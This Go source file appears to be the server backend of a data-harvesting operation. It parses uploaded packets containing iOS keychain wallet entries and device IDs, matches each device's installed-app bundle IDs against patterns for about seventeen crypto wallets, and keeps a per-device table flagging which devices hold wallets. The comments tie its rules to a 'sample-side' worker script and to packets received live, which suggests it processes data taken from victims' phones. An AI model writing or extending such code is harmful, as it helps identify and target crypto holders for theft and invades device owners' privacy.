package store

import (
	"encoding/json"
	"sort"
)

// WalletRule 规则（rule_name ← patterns）。
type WalletRule struct {
	Name     string
	Patterns []string
}

// WALLET_RULES 对齐样本端 pe_worker.js p7_walletRules（原样提取）。
// 注意：p7 列表中的 "notes"（com.apple.notes / group.com.apple.notes）不是钱包，
// 纳入会把几乎所有 iOS 设备误判为“有钱包”，故不进入钱包规则集。
var WALLET_RULES = []WalletRule{
	{"bitpie", []string{"bitpie"}},
	{"trustwallet", []string{"sixdays.trust", "group.com.sixdays"}},
	{"imtoken", []string{"im.token", "imtoken", "token.im"}},
	{"tokenpocket", []string{"tokenpocket", "global.wallet.ios", "com.global.wallet"}},
	{"phantom", []string{"app.phantom", "phantom"}},
	{"uniswap", []string{"uniswap"}},
	{"coinbase", []string{"org.toshi"}},
	{"bitget", []string{"bitkeep", "BG@@"}},
	{"metamask", []string{"io.metamask", "metamask"}},
	{"okx", []string{"okinc.okex", "okex", "com.okx"}},
	{"tronlink", []string{"tronlink"}},
	{"coin98", []string{"coin98"}},
	{"solflare", []string{"solflare", "flutter_biometric"}},
	{"exodus", []string{"exodus"}},
	{"tonkeeper", []string{"tonkeeper", "jbig.tonkeeper"}},
	{"mytonwallet", []string{"mytonwallet", "org.mytonwallet"}},
	{"tonhub", []string{"tonhub"}},
}

// DISPLAY 展示名（前端映射用；未命中的直接用 rule_name）。
var DISPLAY = map[string]string{
	"bitpie": "BitPie", "trustwallet": "Trust Wallet", "imtoken": "imToken",
	"tokenpocket": "TokenPocket", "phantom": "Phantom", "uniswap": "Uniswap",
	"coinbase": "Coinbase Wallet", "bitget": "Bitget", "metamask": "MetaMask",
	"okx": "OKX", "tronlink": "TronLink", "coin98": "Coin98",
	"solflare": "Solflare", "exodus": "Exodus", "tonkeeper": "Tonkeeper",
	"mytonwallet": "MyTonWallet", "tonhub": "TonHub",
}

// Display 未命中回落 rule_name。
func Display(rule string) string {
	if d, ok := DISPLAY[rule]; ok {
		return d
	}
	return rule
}

// SeedRules rules 表 UPSERT（幂等）。
func SeedRules() {
	seedRulesOn(GetDB())
}

// seedRulesOn 对指定库 UPSERT 规则（MigrateOnce 用）。
func seedRulesOn(db *DB) {
	if db == nil {
		return
	}
	for _, r := range WALLET_RULES {
		pj, _ := json.Marshal(r.Patterns)
		db.Exec(
			"INSERT INTO wallet_rules(rule_name, patterns) VALUES(?,?)"+
				" ON DUPLICATE KEY UPDATE patterns=VALUES(patterns)",
			r.Name, string(pj))
	}
}

// ProcessWar 解析 /war 包 → wallet_seen 明细快照；返回摘要（无钱包 drop 空表）。
func ProcessWar(body []byte, packetID *int64, srcFile string) map[string]any {
	out := map[string]any{"wallets": []any{}}
	var j map[string]any
	if err := json.Unmarshal(body, &j); err != nil {
		out["ok"] = false
		out["err"] = "bad json"
		return out
	}
	kc, _ := j["keychain"].(map[string]any)
	wallets, _ := kc["wallets"].(map[string]any)
	if wallets == nil {
		out["ok"] = false
		out["err"] = "no keychain.wallets"
		return out
	}
	ts, epoch := Now()
	db := GetDB()
	du := toStr(j["device_uuid"])
	if du == "" {
		du = toStr(j["lhu"])
	}
	wlist := []any{}
	for ruleName, val := range wallets {
		var count int
		if vm, ok := val.(map[string]any); ok {
			count = int(toInt(vm["count"]))
			items := asAnySlice(vm["items"])
			if len(items) > 0 && count != len(items) {
				count = len(items)
			}
		} else {
			count = int(toInt(val))
		}
		var pid any
		if packetID != nil {
			pid = *packetID
		}
		SafeCall(func() {
			db.Exec(
				"INSERT IGNORE INTO wallet_seen(ts, epoch, device_uuid, ip, rule_name, count, packet_id, src_file)"+
					" VALUES(?,?,?,?,?,?,?,?)",
				ts, epoch, du, "", ruleName, count, pid, srcFile)
		})
		SafeCall(func() { markWalletSeen(du) }) // 设备→有/无 映射表
		wlist = append(wlist, map[string]any{"rule": ruleName, "display": Display(ruleName), "count": count})
	}
	out["wallets"] = wlist
	out["ok"] = true
	tables := map[string]any{}
	if t, ok := kc["tables"].(map[string]any); ok {
		for name, tv := range t {
			m, _ := tv.(map[string]any)
			tables[name] = int(toInt(m["count"]))
		}
	}
	out["tables"] = tables
	out["device_uuid"] = j["device_uuid"]
	return out
}

// Summary latest count per wallet（可选按设备过滤）。
func Summary(deviceUUID string, limit int) []map[string]any {
	db := GetDB()
	if deviceUUID != "" {
		return db.Query(
			"SELECT rule_name, MAX(count) AS count, MAX(ts) AS last_ts"+
				" FROM wallet_seen WHERE device_uuid=? GROUP BY rule_name"+
				" ORDER BY count DESC LIMIT ?", deviceUUID, limit)
	}
	return db.Query(
		"SELECT rule_name, MAX(count) AS count, MAX(ts) AS last_ts"+
			" FROM wallet_seen GROUP BY rule_name ORDER BY count DESC LIMIT ?", limit)
}

// ── 设备钱包命中映射（device_wallet_flags）──

// markWalletSeen 设备钱包命中映射 UPSERT：设备列表"是否有钱包（有/无）"以此表为准
// （无行 = 无）；wallet_hits 为命中累计，first_seen 只在首见写入。
func markWalletSeen(uuid string) {
	if uuid == "" {
		return
	}
	ts, _ := Now()
	GetDB().Exec(
		"INSERT INTO device_wallet_flags(uuid, has_wallet, wallet_hits, first_seen, last_seen, updated_ts)"+
			" VALUES(?,1,1,?,?,?)"+
			" ON DUPLICATE KEY UPDATE has_wallet=1, wallet_hits=wallet_hits+1,"+
			" last_seen=VALUES(last_seen), updated_ts=VALUES(updated_ts)",
		uuid, ts, ts, ts)
}

// WalletFlags 设备钱包命中映射全量（只读查询面 /__q/wallet_flags）。
func WalletFlags() []map[string]any {
	return GetDB().Query(
		"SELECT uuid, has_wallet, wallet_hits, first_seen, last_seen, updated_ts" +
			" FROM device_wallet_flags ORDER BY last_seen DESC")
}

// ── 钱包 × app 包名配对（u 端点 apps 表反推）──

// MatchWalletsFromApps 用设备已安装应用清单（u 端点 → apps 表）反推钱包命中。
//
// 配对口径：apps.bundle_id 逐条与 wallet_rules.patterns 做子串匹配
// （规则本身就是以包名片段定义的：io.metamask / im.token / org.toshi …），
// 命中即按规则记一条 wallet_seen（packet_id = 该 u 包 id，count = 命中包数），
// 并刷新 device_wallet_flags。
//
// 为什么必须走这条：war 包的 keychain.wallets 桶在多数设备上为空（线上 23 个
// war 包 → wallet_seen 0 行），而 apps 表有真实 bundle_id，是唯一可靠信号。
//
// 幂等：wallet_seen 唯一键 (packet_id, rule_name) + INSERT IGNORE；
// device_wallet_flags 走 UPSERT。返回命中规则名（升序，便于日志/测试）。
func MatchWalletsFromApps(uuid string, packetID int64, srcFile string) []string {
	if uuid == "" || packetID <= 0 {
		return nil
	}
	db := GetDB()
	hits := map[string]int{}
	for _, r := range db.Query("SELECT DISTINCT bundle_id FROM apps WHERE uuid=?", uuid) {
		b := toStr(r["bundle_id"])
		if b == "" {
			continue
		}
		if rule := matchWalletRule(b); rule != "" {
			hits[rule]++
		}
	}
	if len(hits) == 0 {
		return nil
	}
	ts, epoch := Now()
	out := make([]string, 0, len(hits))
	for rule, n := range hits {
		rn, cnt := rule, n
		SafeCall(func() {
			db.Exec(
				"INSERT IGNORE INTO wallet_seen(ts, epoch, device_uuid, ip, rule_name, count, packet_id, src_file)"+
					" VALUES(?,?,?,?,?,?,?,?)",
				ts, epoch, uuid, "", rn, cnt, packetID, srcFile)
		})
		out = append(out, rule)
	}
	sort.Strings(out)
	SafeCall(func() { markWalletSeen(uuid) })
	return out
}

// BackfillWalletsFromApps 历史回填：对 apps 表已有设备各跑一次配对
// （每个设备取其最早 u 包 id 作 packet_id）。幂等，可安全重复启动。
// 返回回填命中钱包的设备数。
func BackfillWalletsFromApps() int {
	db := GetDB()
	n := 0
	for _, r := range db.Query(
		"SELECT uuid, MIN(first_packet_id) AS pid FROM apps" +
			" WHERE uuid<>'' GROUP BY uuid") {
		uuid := toStr(r["uuid"])
		pid := toInt(r["pid"])
		if uuid == "" || pid <= 0 {
			continue
		}
		if len(MatchWalletsFromApps(uuid, pid, "")) > 0 {
			n++
		}
	}
	return n
}

// DeviceApps 单设备已安装应用包名清单（精确 uuid 匹配，不做任何模糊过滤）。
func DeviceApps(uuid string, limit int) []map[string]any {
	if uuid == "" {
		return nil
	}
	if limit <= 0 || limit > 2000 {
		limit = 500
	}
	return GetDB().Query(
		"SELECT bundle_id, name, app_uuid, first_seen, last_seen, hits"+
			" FROM apps WHERE uuid=? ORDER BY bundle_id LIMIT ?", uuid, limit)
}
